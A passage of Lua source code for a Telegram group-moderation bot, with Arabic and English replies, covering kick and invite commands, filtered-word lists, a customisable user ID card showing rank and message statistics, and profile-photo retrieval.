hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The user ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ has been kicked ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم  ( طرده ) بنجاح *', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end
--------------------------HXOUSE TEAM-------------------------------
if text:match("^[Kk]ick @(.*)$") then
local ap = {string.match(text, "^([Kk]ick) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and hxousedx1:get("hxouse:lock:ban"..bot_id..msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع الحظر او الطرد \n⌯︙ لانه معطل من قبل المنشئ ', 1, 'md')
return "hxouse"
end
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.id_)
local hxouse_res = user_info_
if user_info_ then
if result.id_ then
if not is_momod(result.id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
texts = '*⌯︙ The User ؛ '..result.id_..' ، 🚷\n⌯︙ has been kicked ༯ \nֆ                 ֆ*'
else
texts = '⌯︙ العضو ( '..hxouse_res..' )\n⌯︙ ايديه ( '..result.id_..' )\n⌯︙ بواسطه ( '..renk_hxouse(msg)..' )\n⌯︙ تم  ( طرده ) بنجاح'
end
chat_kick(msg.chat_id_, result.id_)
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
texts = '*⌯︙ Username is not correct *'
else
text = '*⌯︙ المعرف غير صحيح *'
end
end
end
hxousedx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],ban_by_username)
end
------------------------------HXOUSE TEAM-----------------------------------------------------------------
if text:match("^[Kk]ick (%d+)$") then
local ap = {string.match(text, "^([Kk]ick) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and hxousedx1:get("hxouse:lock:ban"..bot_id..msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع الحظر او الطرد \n⌯︙ لانه معطل من قبل المنشئ ', 1, 'md')
return "hxouse"
end
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. ap[2])
local hxouse_res = user_info_
if user_info_ then
if not is_momod(ap[2], msg.chat_id_) then
chat_kick(msg.chat_id_, ap[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The user ؛ '..ap[2]..' ، 🚷\n⌯︙ has been kicked ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ * تم  ( طرده ) بنجاح *', 1, 'md')
end end end end
-----------------------------------HXOUSE TEAM-----------------------------------------------------------
      if text:match("^[Ff]ilterlist$") or text:match("^قائمه المنع$") then
            local hash = (HXOUSE..'bot:filters:'..msg.chat_id_)
            if hash then
              local names = hxousedx1:hkeys(hash)
              if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
                text = "⌯︙ Filterlist ↓↓ : \nٴ… … … … … … … … … … …\n"
              else
                text = "⌯︙ قائمه الكلمات الممنوعه ↓↓ : \nٴ… … … … … … … … … … …\n"
              end
              for i=1, #names do
                text = text..'» 🚸 '..names[i]..'\n'
              end
              if #names == 0 then
                if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
                  text = "⌯︙ Filterlist is empty ༯"
                else
                  text = "⌯︙ لا يوجد كلمات ممنوعه ༯"
                end
              end
              hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
            end
          end
----------------------------------HXOUSE TEAM-------------------------------------------------------------
if text:match("^[Ff]ilterall list$") or text:match("^قائمه المنع العام$") then
local hash = (HXOUSE..'bot:freewords:')
if hash then
local names = hxousedx1:hkeys(hash) 
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '⌯︙ Filter all list ↓↓ : \nٴ… … … … … … … … … … …\n'
else
text = '⌯︙ قائمه المنع العام ↓↓ : \nٴ… … … … … … … … … … …\n'
end
for i=1, #names do
text = text..' » 🚸 '..names[i]..'\n'
end
if #names == 0 then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = "⌯︙ Filter all list is empty ༯"
else
text = "⌯︙ لا يوجد كلمات ممنوعه عام ༯"
end
end
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
----------------------------------------HXOUSE TEAM-------------------------------------------------------
local text = msg.content_.text_:gsub('اضافه','Invite')
if text:match("^[Ii]nvite$") and msg.reply_to_message_id_ ~= 0 then
function inv_reply(extra, result, success)
add_user(result.chat_id_, result.sender_user_id_, 5)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
end
-----------------------------------HXOUSE TEAM------------------------------------------------------------
if text:match("^[Ii]nvite @(.*)$") then
local ap = {string.match(text, "^([Ii]nvite) @(.*)$")}
function invite_by_username(extra, result, success)
if result.id_ then
add_user(msg.chat_id_, result.id_, 5)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
texts = '⌯︙ User not found '
else
texts = '⌯︙ المعرف غير صحيح '
end
hxousedx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
end
resolve_username(ap[2],invite_by_username)
end
end
--------------------------------------HXOUSE TEAM---------------------------------------------------------
if text:match("^[Ii]nvite (%d+)$") then
local ap = {string.match(text, "^([Ii]nvite) (%d+)$")}
add_user(msg.chat_id_, ap[2], 5)
end
-------- 
if text:match("^تعيين الايدي$") and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ اتبع التعليمات ليتم تعيين الكليشه الجديده \n⌯︙ اليك دوال طبع الايدي استخدم الكلمات الانكليزية \n\n username  »  لطبع يوزر العضو\n photo  »  لطبع عدد صور العضو \n nkat  »  لطبع عدد نقاط العضو \n cont  »  لطبع عدد اضافات العضو\n sticker  »  لطبع عدد ملصقات العضو\n msgs  »  لطبع عدد رسائل العضو\n id  »  لطبع ايدي العضو \n formsg  »  لطبع تفاعل العضو \n renk  »  لطبع رتبه العضو ', 1, 'md')
hxousedx1:set("HXOUSE:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'hxouse')
return "hxouse"
end
if text and is_owner(msg.sender_user_id_, msg.chat_id_)  and hxousedx1:get("HXOUSE:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
hxousedx1:del("HXOUSE:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حفض الكليشه الجديده  ', 1, 'md')
hxousedx1:set("HXOUSE:hxouse:id:text:"..bot_id..msg.chat_id_,text)
end
if text:match("^مسح الايدي$") and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم مسح كليشه الايدي  ', 1, 'md')
hxousedx1:del("HXOUSE:hxouse:id:text:"..bot_id..msg.chat_id_)
end
---------------------------------HXOUSE TEAM--------------------------------------------------------------  
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and hxouse11(msg) then
function hxouse(extra,result,success)
if result.username_ then username = '@'..result.username_ else username = ' لا يوجد 🎍 ' end
local function getpro(extra, result, success) 
local hxouse = hxousedx1:get(HXOUSE..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local hxousey = (hxousedx1:get('hxouse:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = hxousedx1:get(HXOUSE..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(hxousedx1:get(HXOUSE.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local user_nkt = tonumber(hxousedx1:get(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(hxousedx1:get(HXOUSE..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(hxousedx1:get(HXOUSE..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
if result.photos_[0] then
if tonumber(msg.sender_user_id_) == tonumber(902039110) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer 👨‍💻'
else
t = 'مبرمج السورس'
end
elseif is_leader(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_sudoid(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 2'
else
t = 'مطور ثانوي '
end
elseif is_admin(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ اساسي'
end
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not hxousedx1:get('HXOUSE:id:mute'..msg.chat_id_) then 
if not hxousedx1:get('HXOUSE:id:photo'..msg.chat_id_) then 
if not hxousedx1:get("HXOUSE:hxouse:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"\n⌯︙ يوزرك ⌯» { "..username.." }\n⌯︙ صورك ⌯» {"..result.total_count_.."}\n⌯︙ ايديك ⌯» {"..msg.sender_user_id_.."}\n⌯︙ رتبتك ⌯» {"..t.."}\n⌯︙ رسائلك ⌯» {"..(user_msgs + hxousey).." / "..(hxouse).."}\n⌯︙ تفاعلك ⌯»{"..formsgg(msguser).."}\n⌯︙ نقاطك ⌯» {"..user_nkt.."}\n⌯︙ جهاتك ⌯» {"..cont.."}\nٴ… … … … … … … … … … …\n",msg.id_,msg.id_.."")
else 
local new_id = hxousedx1:get("HXOUSE:hxouse:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('username',(username or 'لا يوجد'))
local new_id = new_id:gsub('photo',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('nkat',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('msgs',(user_msgs + hxousey / hxouse or 'لا يوجد'))
local new_id = new_id:gsub('id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('renk',(t or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if tonumber(msg.sender_user_id_) == tonumber(902039110) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer 👨‍💻'
else
t = 'مبرمج السورس'
end
elseif is_leader(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_sudoid(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 2'
else
t = 'مطور ثانوي '
end
elseif is_admin(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ اساسي'
end
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not hxousedx1:get("HXOUSE:hxouse:id:text:"..bot_id..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ يوزرك ⌯» { "..username.." }\n⌯︙ صورك ⌯» {"..result.total_count_.."}\n⌯︙ ايديك ⌯» {"..msg.sender_user_id_.."}\n⌯︙ رتبتك ⌯» {"..t.."}\n⌯︙ رسائلك ⌯» {"..(user_msgs + hxousey).." / "..(hxouse).."}\n⌯︙ تفاعلك ⌯»{"..formsgg(msguser).."}\n⌯︙ نقاطك ⌯» {"..user_nkt.."}\n⌯︙ جهاتك ⌯» {"..cont.."}\nٴ… … … … … … … … … … …\n", 1, 'html')
else
local new_id = hxousedx1:get("HXOUSE:hxouse:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('username',(username or 'لا يوجد'))
local new_id = new_id:gsub('photo',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('nkat',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('msgs',(user_msgs + hxousey / hxouse or 'لا يوجد'))
local new_id = new_id:gsub('id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('renk',(t or 'لا يوجد'))
hxousedx(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ID disabled  ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ الايدي معطل  ', 1, 'md')
end
end
else
if tonumber(msg.sender_user_id_) == tonumber(902039110) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer 👨‍💻'
else
t = 'مبرمج السورس'
end
elseif is_leader(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_sudoid(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 2'
else
t = 'مطور ثانوي '
end
elseif is_admin(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ اساسي'
end
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not hxousedx1:get('HXOUSE:id:mute'..msg.chat_id_) then
if not hxousedx1:get('HXOUSE:id:photo'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "◗≡¹┇ You not have any photo \n◗≡²┇ User name ‹› "..username.."\n◗≡³┇ Point ‹› "..user_nkt.."\n◗≡⁴┇ Contacts ‹› "..cont.."\n◗≡°┇ Sticker ‹› "..sticker.."\n◗≡⁴┇ Msg ‹› "..user_msgs.."\n◗≡³┇ ID ‹› "..msg.sender_user_id_.."\n◗≡²┇ interaction ‹› "..formsgg(msguser).."\n◗≡¹┇ Renk ‹› "..t.."\n", 1, 'html')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ لا استطيع عرض صورتك الاسباب المحتمله ⌯\n⌯︙ انك دخلت للبوت ثم حظرته ⌯\n⌯︙ انك لا تمتلك صوره شخصيه ⌯\n⌯︙ انك قمت بقفلها من اعدادات تليكرام ⌯\n\n⌯︙ يوزرك ⌯» { "..username.." }\n⌯︙ صورك ⌯» {"..result.total_count_.."}\n⌯︙ ايديك ⌯» {"..msg.sender_user_id_.."}\n⌯︙ رتبتك ⌯» {"..t.."}\n⌯︙ رسائلك ⌯» {"..(user_msgs + hxousey).." / "..(hxouse).."}\n⌯︙ تفاعلك ⌯»{"..formsgg(msguser).."}\n⌯︙ نقاطك ⌯» {"..user_nkt.."}\n⌯︙ جهاتك ⌯» {"..cont.."}\nٴ… … … … … … … … … … …\n", 1, 'html')
end
else
if tonumber(msg.sender_user_id_) == tonumber(902039110) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Source programmer 👨‍💻'
else
t = 'مبرمج السورس'
end
elseif is_leader(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_sudoid(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 2'
else
t = 'مطور ثانوي '
end
elseif is_admin(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ اساسي'
end
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "◗≡¹┇ User name ‹› "..username.."\n◗≡²┇ Photo ‹› "..result.total_count_.."\n◗≡³┇ Point ‹› "..user_nkt.."\n◗≡⁴┇ Contacts ‹› "..cont.."\n◗≡°┇ Sticker ‹› "..sticker.."\n◗≡⁴┇ Msg ‹› "..user_msgs.."\n◗≡³┇ ID ‹› "..msg.sender_user_id_.."\n◗≡²┇ interaction ‹› "..formsgg(msguser).."\n◗≡¹┇ Renk ‹› "..t.."\n", 1, 'html')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ يوزرك ⌯» { "..username.." }\n⌯︙ صورك ⌯» {"..result.total_count_.."}\n⌯︙ ايديك ⌯» {"..msg.sender_user_id_.."}\n⌯︙ رتبتك ⌯» {"..t.."}\n⌯︙ رسائلك ⌯» {"..(user_msgs + hxousey).." / "..(hxouse).."}\n⌯︙ تفاعلك ⌯»{"..formsgg(msguser).."}\n⌯︙ نقاطك ⌯» {"..user_nkt.."}\n⌯︙ جهاتك ⌯» {"..cont.."}\nٴ… … … … … … … … … … …\n", 1, 'html')
end
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ID disabled  ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ الايدي معطل  ', 1, 'md')
end end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1
}, getpro, nil)
end
getUser(msg.sender_user_id_, hxouse)
end
end 
------------------------------------------HXOUSE TEAM----------------------------------------------------
if text == "صورتي" and not hxousedx1:get(HXOUSE.."lock:get:photo"..msg.chat_id_)  and hxouse11(msg) then 
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"⌯︙ لديك "..result.total_count_.." صوره‌‏ ", msg.id_, msg.id_, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ لا تمتلك صوره في حسابك  ", 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end 
if text:match("^صورتي (%d+)$") and hxouse11(msg) then
local pronumb = {string.match(text, "^(صورتي) (%d+)$")}
local function gproen(extra, result, success)
if not is_momod(msg.sender_user_id_, msg.chat_id_) and hxousedx1:get(HXOUSE.."lock:get:photo"..msg.chat_id_)  then 
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Get profile photo is deactive ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '️⌯︙ جلب الصوره الشخصيه معطل  ༯', 1, 'md')
end
else
if pronumb[2] == '1' then
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك صوره شخصيه ", 1, 'md')
end
end
elseif pronumb[2] == '2' then
if result.photos_[1] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have 2 profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '3' then
if result.photos_[2] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have 3 profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '4' then
if result.photos_[3] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have 4 profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '5' then
if result.photos_[4] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't 5 have profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '6' then
if result.photos_[5] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ You don't have 6 profile photo ", 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ", 1, 'md')
end
end
elseif pronumb[2] == '7' then
